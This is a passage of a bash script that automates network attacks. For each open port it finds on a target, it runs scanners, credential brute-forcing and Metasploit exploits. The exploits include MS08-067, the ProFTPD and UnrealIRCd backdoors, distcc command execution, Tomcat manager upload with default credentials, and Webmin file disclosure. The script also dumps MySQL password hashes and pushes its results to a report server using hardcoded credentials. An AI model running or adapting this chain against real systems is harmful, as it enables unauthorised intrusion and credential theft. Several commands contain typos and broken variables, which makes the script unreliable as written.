  echo ""
  echo -e "${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED GATHERING SSL/TLS INFO ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/sslcheck.py --xml $LOG_DIR/$TARGET.sslcheck_443.xml $TARGET -port 443  
  sslscan --no-failed $TARGET  >> $LOG_DIR/$TARGET.sslscan.txt  
  echo ""
  ##echo -e "${GREEN}====================================================================================${RESET}"
  ##echo -e "$RED SAVING SCREENSHOTS ${RESET}"
  ##echo -e "${GREEN}====================================================================================${RESET}"
  ##cutycapt --url=https://$TARGET --out=$LOG_DIR/$TARGET-port443.jpg  
  #echo -e "$RED[+]${RESET} Screenshot saved to $LOG_DIR/$TARGET-port443.jpg"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  nikto -h https://$TARGET -Format xml -o $LOG_DIR/$TARGET.nikto_.443.xml    
  #arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* https://$TARGET  > test.arachni.log  
  #arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_443.xml  
  #cat $LOG_DIR/$TARGET-http_443.xml |grep -v Arachni | grep -v Author | grep -v Website | grep -v Documentation  
  echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url https://$TARGET --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscanhttps.txt  
    echo ""
    wpscan --url https://$TARGET/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscanhttps.txt  
    wpscan --url https://$TARGET/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscanhttps.txt  
    wpscan --url https://$TARGET/blog/wp-login.php --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscanhttps.txt
  echo -e "$RED #####################################################"
  echo -e "$ORANGE + -- --=[end Port 443 httpS tests...${RESET}"
  echo -e "$RED #####################################################"
fi

if [ -z "$port_445" ];
then
  echo -e "$RED + -- --=[Port 445 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 445 opened... running tests...${RESET}"
  enum4linux $TARGET > $LOG_DIR/$TARGET.enum4linux_445.txt #  
  python $SAMRDUMP $TARGET >  $LOG_DIR/$TARGET.smadump_445.txt #  
  nbtscan $TARGET >  $LOG_DIR/$TARGET.nbtscan_445.txt #  
  nmap -vv -A -sV -Pn  -p445 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET -oX  $LOG_DIR/$TARGET.port_445.txt   
  msfconsole -x "workspace "$WORKSPACE"; use auxiliary/scanner/smb/pipe_auditor; setg RPORT 445; setg RPORTS 445; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use auxiliary/scanner/smb/pipe_dcerpc_auditor; schow options; run; use auxiliary/scanner/smb/psexec_loggedin_users; schow options; run; use auxiliary/scanner/smb/smb2; schow options; run; use auxiliary/scanner/smb/smb_enum_gpp; schow options; run; use auxiliary/scanner/smb/smb_enumshares; schow options; run; use auxiliary/scanner/smb/smb_enumusers; schow options; run; use auxiliary/scanner/smb/smb_enumusers_domain; schow options; run; use auxiliary/scanner/smb/smb_login; schow options; run; use auxiliary/scanner/smb/smb_lookupsid; schow options; run; use auxiliary/scanner/smb/smb_uninit_cred; schow options; run; use auxiliary/scanner/smb/smb_version; schow options; run; exit;" >> $LOG_DIRmsfworkspace.log #  
# ADD SERVER OPTION IN SCRIPT THE ACTIVATE #
#  msfconsole -x "use exploit/linux/samba/chain_reply; show options; run; exit -y; exit;"
  echo -e "$ORANGE ###################################################### ${RESET}"
  echo -e "$RED    #       start exploit ms08_067_netapi...${RESET}       #"
  echo -e "$ORANGE ###################################################### ${RESET}"
  msfconsole -x "use windows/smb/ms08_067_netapi; setg RPORT 445; setg RHOST "$TARGET"; show options; run -z; exit -y; exit;" #  
  echo -e ""
  echo -e "$ORANGE ###################################################### ${RESET}"
  echo -e "$RED    #         end exploit ms08_067_netapi...${RESET}       #"
  echo -e "$ORANGE ###################################################### ${RESET}"
  echo -e "$RED ################################ ${RESET}"
  echo -e "$ORANGE + -- --=[end Port 445 tests...${RESET}"
  echo -e "$RED #################################${RESET}"
fi

if [ -z "$port_512" ];
then
  echo -e "$RED + -- --=[Port 512 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 512 opened... running tests...${RESET}"
  nmap -A -sV -Pn  -p 512 --script=rexec* $TARGET -oX $LOG_DIR/$TARGET.rexec.xml   
fi

if [ -z "$port_513" ]
then
  echo -e "$RED + -- --=[Port 513 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 513 opened... running tests...${RESET}"
  nmap -A -sV  -Pn -p 513 --script=rlogin* $TARGET -oX $LOG_DIR/$TARGET.rlogin.xml   
fi

if [ -z "$port_514" ];
then
  echo -e "$RED + -- --=[Port 514 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 514 opened... running tests...${RESET}"
  nmap $TARGET 514 -A > $LOG_DIR/$TARGET.amap.txt   
fi

if [ -z "$port_623" ];
then
  echo -e "$RED + -- --=[Port 623 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 623 opened... running tests...${RESET}"
  nmap $TARGET 623 -A >> $LOG_DIR/$TARGET.amap.txt    
  nmap -A -sV -Pn  --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET -oX $LOG_DIR/$TARGET.intel.xml   
fi

if [ -z "$port_624" ];
then
  echo -e "$RED + -- --=[Port 624 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 624 opened... running tests...${RESET}"
  nmap $TARGET 624 -A >> $LOG_DIR/$TARGET.amap.txt   
  nmap -A -sV -Pn  --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET -oX $LOG_DIR/$TARGET.intel2.xml   
fi

if [ -z "$port_1099" ];
then
  echo -e "$RED + -- --=[Port 1099 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 1099 opened... running tests...${RESET}"
  nmap $TARGET 1099 -A >> $LOG_DIR/$TARGET.amap.txt   
  nmap -A -sV -Pn  -p 1099 --script=rmi-* $TARGET -oX $LOG_DIR/$TARGET.rmi.xml   
  msfconsole -x "use auxiliary/gather/java_rmi_registry; set RHOST "$TARGET"; run;"  
  msfconsole -x "use auxiliary/scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;"  
fi


if [ -z "$port_1433" ];
then
  echo -e "$RED + -- --=[Port 1433 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 1433 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=ms-sql* -p 1433 $TARGET -oX $LOG_DIR/$TARGET.ms-sql.xml   
fi

if [ -z "$port_2049" ];
then
  echo -e "$RED + -- --=[Port 2049 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 2049 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=nfs* -p 2049 $TARGET   
  rpcinfo -p $TARGET > $LOG_DIRTARGET.rpcinfo.log  
  showmount -e $TARGET > $LOG_DIR$TARGET.showmount.log  
  smbclient -L $TARGET -U " "%" "  >> $LOG_DIR$TARGET.smbclient.log
fi

if [ -z "$port_2121" ];
then
  echo -e "$RED + -- --=[Port 2121 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 2121 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=ftp* -p 2121 $TARGET   
  msfconsole -x "use exploit/unix/ftp/proftpd_133c_backdoor; setg RPORT 2121; setg RPORTS 2121; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use exploit/unix/ftp/proftpd_133c_backdoor; run; use exploit/freebsd/ftp/proftp_telnet_iac; run; use exploit/linux/ftp/proftp_sreplace; run; exit  "  
fi

if [ -z "$port_3306" ];
then
  echo -e "$RED + -- --=[Port 3306 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 3306 opened... running tests...${RESET}"
  nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET   
  mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;' > $LOG_DIR$TARGET.mysqlclient.log  
 msfconsole -x "use auxiliary/admin/mysql/mysql_enum; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 3306; setg RPORTS 3306; run; use auxiliary/scanner/mysql/mysql_login; run; use auxiliary/scanner/mysql/mysql_version; run; exit;"  
fi

if [ -z "$port_3310" ];
then
  echo -e "$RED + -- --=[Port 3310 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 3310 opened... running tests...${RESET}"
  nmap -A -p 3310 -Pn  -sV  --script clamav-exec $TARGET   
fi

if [ -z "$port_3128" ];
then
  echo -e "$RED + -- --=[Port 3128 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 3128 opened... running tests...${RESET}"
  nmap -A -p 3128 -Pn  -sV  --script=*proxy* $TARGET   
fi

if [ -z "$port_3389" ];
then
  echo -e "$RED + -- --=[Port 3389 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 3389 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=rdp-* -p 3389 $TARGET   
  rdesktop $TARGET &
fi

if [ -z "$port_3632" ];
then
  echo -e "$RED + -- --=[Port 3632 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 3632 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=distcc-* -p 3632 $TARGET   
  msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"  
fi

if [ -z "$port_4443" ];
then
  echo -e "$RED + -- --=[Port 4443 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 4443 opened... running tests...${RESET}"
  wafw00f http://$TARGET:4443 > $LOG_DIR/$TARGET.wafw00f4443.txt
  echo ""
  whatweb http://$TARGET:4443
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 4443 
  sslscan --no-failed $TARGET:4443
  python $TOOL_DIR/sslcheck.py  --xml $LOG_DIR/$TARGET.sslcheck_4443.xml $TARGET -port 4443
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.4443.xml
  #cutycapt --url=https://$TARGET:4443 --out=$LOG_DIR/$TARGET-port4443.jpg 2> /dev/null
  nmap -sV -Pn -A -p 4443  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap4443.xml 
  #echo -e "$RED[+]${RESET} Screenshot saved to $LOG_DIR/$TARGET-port443.jpg"
  #echo -e "${GREEN}====================================================================================${RESET}"
  #echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
  #echo -e "${GREEN}====================================================================================${RESET}"
  #arachni --report-save-path=$LOG_DIR --output-only-positives --checks=active/* http://$TARGET:4443  > test.arachni.log  
  #arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_4443.xml
  #cat $LOG_DIR/$TARGET-http_4443.xml |grep -v Arachni | grep -v Author | grep -v Website | grep -v Documentation
fi

if [ -z "$port_5432" ];
then
  echo -e "$RED + -- --=[Port 5432 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 5432 opened... running tests...${RESET}"
  nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET   
fi

if [ -z "$port_5800" ];
then
  echo -e "$RED + -- --=[Port 5800 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 5800 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=vnc* -p 5800 $TARGET   
fi

if [ -z "$port_5900" ];
then
  echo -e "$RED + -- --=[Port 5900 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 5900 opened... running tests...${RESET}"
  nmap -A -sV  --script=vnc* -p 5900 $TARGET   
fi

if [ -z "$port_5984" ];
then
  echo -e "$RED + -- --=[Port 5984 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 5984 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=couchdb* -p 5984 $TARGET   
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"  
fi

if [ -z "$port_6000" ];
then
  echo -e "$RED + -- --=[Port 6000 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 6000 opened... running tests...${RESET}"
  nmap -A -sV -Pn  --script=x11* -p 6000 $TARGET   
  msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;"  
fi

if [ -z "$port_6667" ];
then
  echo -e "$RED + -- --=[Port 6667 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 6667 opened... running tests...${RESET}"
  nmap -A -sV -Pn --script=irc* -p 6667 $TARGET   
  msfconsole -x "use unix/irc/unreal_ircd_3281_backdoor; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"
fi

if [ -z "$port_8000" ];
then
  echo -e "$RED + -- --=[Port 8000 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8000 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8000 > $LOG_DIR/$TARGET.wafw00f8000.txt
  echo ""
  whatweb http://$TARGET:8000
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8000
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8000.xml
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8000  $TARGET -oX $LOG_DIR/$TARGET.nmap_8000.xml
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/wjexboss.py -u http://$TARGT:8000 -out $LOG_DIR/$TARGET.jexboss.log
fi

if [ -z "$port_8100" ];
then
  echo -e "$RED + -- --=[Port 8100 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8100 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8100 
  echo ""
  whatweb http://$TARGET:8100
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8100
  sslscan --no-failed $TARGET:8100
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8100.xml
  cutycapt --url=http://$TARGET:8100 --out=$LOG_DIR/$TARGET-port8100.jpg 2> /dev/null
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 $TARGET -oX $LOG_DIR/$TARGET.nmap_8100.xml   
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:8100 -out $LOG_DIR/$TARGET.jexboss8100.log
fi

if [ -z "$port_8080" ];
then
  echo -e "$RED + -- --=[Port 8080 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8080 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8080
  echo ""
  whatweb http://$TARGET:8080
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8080
  sslscan --no-failed $TARGET:8080
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8080.xml
  cutycapt --url=http://$TARGET:8080 --out=$LOG_DIR/$TARGET-port8080.jpg 2> /dev/null
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8080.xml   
  msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration;setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum;run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"  
  # EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
  #msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"   
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:8080 -out $LOG_DIR/$TARGET.jexboss8080.log 
fi

if [ -z "$port_8180" ];
then
  echo -e "$RED + -- --=[Port 8180 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8180 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8180
  echo ""
  whatweb http://$TARGET:8180
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8180
  sslscan --no-failed $TARGET:8180
  python $TOOL_DIR/sslcheck.py --xml $LOG_DIR/$TARGET.sslcheck_8180.xml $TARGET -port 8180
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8180.xml
  cutycapt --url=http://$TARGET:8180 --out=$LOG_DIR/$TARGET-port8180.jpg  
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8180.xml   
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"  
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNING APACHE TOMCAT EXPLOITS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  msfconsole -x "use use auxiliary/admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use auxiliary/admin/http/tomcat_administration;setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080;run; use auxiliary/admin/http/tomcat_utf8_traversal; run; use auxiliary/scanner/http/tomcat_enum;run; use auxiliary/scanner/http/tomcat_mgr_login; run; use auxiliary/multi/http/tomcat_mgr_deploy; run;use auxiliary/multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;"  
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:8180 -out $LOG_DIR/$TARGET.jexboss8180.log  
fi

if [ -z "$port_8443" ];
then
  echo -e "$RED + -- --=[Port 8443 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8443 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8443 > $LOG_DIR/$TARGET.wafw00f8443.txt  
  echo ""
  whatweb http://$TARGET:8443
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8443
  sslscan --no-failed $TARGET:8443
  python $TOOL_DIR/sslcheck.py  --xml $LOG_DIR/$TARGET.sslcheck_8443.xml $TARGET -port 8443
  nikto -h https://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8443.xml
  cutycapt --url=https://$TARGET:8443 --out=$LOG_DIR/$TARGET-port8443.jpg  
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8443.xml   
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u https://$TARGET:8443 -out $LOG_DIR/$TARGET.jexboss8443.log  
fi

if [ -z "$port_8888" ];
then
  echo -e "$RED + -- --=[Port 8888 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 8888 opened... running tests...${RESET}"
  wafw00f http://$TARGET:8888 > $LOG_DIR/$TARGET.wafw00f8888.txt
  echo ""
  whatweb http://$TARGET:8888
  echo ""
  python /media/sf_KaliSharedFolder/tools/autoscan/tools/XSSTracer/xsstracer.py $TARGET 8888
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto.8888.xml
  cutycapt --url=https://$TARGET:8888 --out=$LOG_DIR/$TARGET-port8888.jpg 2> /dev/null
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8888  $TARGET -oX $LOG_DIR/$TARGET.nmap_8888.xml   
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:8888 -out $LOG_DIR/$TARGET.jexboss8888.log
fi

if [ -z "$port_10000" ];
then
  echo -e "$RED + -- --=[Port 10000 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 10000 opened... running tests...${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;"  
fi

if [ -z "$port_16992" ];
then
  echo -e "$RED + -- --=[Port 16992 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 16992 opened... running tests...${RESET}"
  nmap $TARGET 16992 -A   
  nmap -A -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET   
fi

if [ -z "$port_27017" ];
then
  echo -e "$RED + -- --=[Port 27017 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 27017 opened... running tests...${RESET}"
  nmap -sV -p 27017 -Pn  --script=mongodb* $TARGET   
fi

if [ -z "$port_27017" ];
then
  echo -e "$RED + -- --=[Port 27017 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 27017 opened... running tests...${RESET}"
  nmap -sV -p 27017 -Pn  --script=mongodb* $TARGET   
fi

if [ -z "$port_27018" ];
then
  echo -e "$RED + -- --=[Port 27018 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 27018 opened... running tests...${RESET}"
  nmap -sV  -p 27018 -Pn  --script=mongodb* $TARGET   
fi

if [ -z "$port_27019" ];
then
  echo -e "$RED + -- --=[Port 27019 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 27019 opened... running tests...${RESET}"
  nmap -sV  -p 27019 -Pn  --script=mongodb* $TARGET   
fi

if [ -z "$port_28017" ];
then
  echo -e "$RED + -- --=[Port 28017 closed... skipping.${RESET}"
else
  echo -e "$ORANGE + -- --=[Port 28017 opened... running tests...${RESET}"
  nmap -sV  -p 28017 -Pn  --script=mongodb* $TARGET   
fi

#echo -e "${GREEN}====================================================================================${RESET}"
#echo -e "$RED SCANNING FOR COMMON VULNERABILITIES ${RESET}"
#echo -e "${GREEN}====================================================================================${RESET}"
#ruby $TOOL_DIR/yasuo/yasuo.rb -r $TARGET -b all -f $LOG_DIR/$TARGET/yasuo.xml
#
echo "press any key to import file to report server"
read -n 1 -s
#
echo -e "${OKGREEN}====================================================================================${RESET}"
echo -e "$OKRED Import all files in metasploit  $RESET"
echo -e "${OKGREEN}====================================================================================${RESET}"
echo "automated metasploit import tool for xml files by @darksh3llgr"


msfconsole -x "workspace $workspace; db_import $LOG_DIR/*.xml;exit;"
msfconsole -x "workspace $workspace; db_export -f xml $LOG_DIR/$CUSTOMER.msf.xml;exit;"
#
DATE=$(date)
#
echo -e "${GREEN}====================================================================================${RESET}"
echo -e "$RED Import all files in Fraday ${RESET}"
echo -e "${GREEN}====================================================================================${RESET}"
echo '#!/usr/bin/python2.7' > $LOG_DIR/$CustomerName.py
echo 'from persistence.server import server'  >> $LOG_DIR/$CustomerName.py
echo 'import time' >> $LOG_DIR/$CustomerName.py
echo 'server.FARADAY_UP = False' >> $LOG_DIR/$CustomerName.py
echo 'server.SERVER_URL = "http://127.0.0.1:5985"'  >> $LOG_DIR/$CustomerName.py
echo 'server.AUTH_USER = "faraday"'  >> $LOG_DIR/$CustomerName.py
echo 'server.AUTH_PASS = "changeme"'  >> $LOG_DIR/$CustomerName.py
echo 'date_today = int(time.time() * 1000)'  >> $LOG_DIR/$CustomerName.py
echo "server.create_workspace('$CustomerName', '$CustomerName', '$DATE', '$DATE', '$CustomerName')" >> $LOG_DIR/$CustomerName.py
#
scp -P 22 -o StrictHostKeyChecking=no $LOG_DIR/$CustomerName.py root@$ReportServer:/root/infobyte/faraday/.
ssh -p 22 -o StrictHostKeyChecking=no root@$ReportServer  "cd /root/infobyte/faraday;python $CustomerName.py;exit"
#
faraday=/root/infobyte/faraday
cd $LOG_DIR
#
for XMLfile in $(ls -al | grep  xml | awk '{print $9}');
        do 
  echo "Import $XMLfile to faraday"
  python $faraday/faraday.pyc --cli --workspace $CustomerName -r $LOG_DIR/$XMLfile
done;


rm $WORK_DIR/hydra.restore
rm $WORK_DIR/stash*

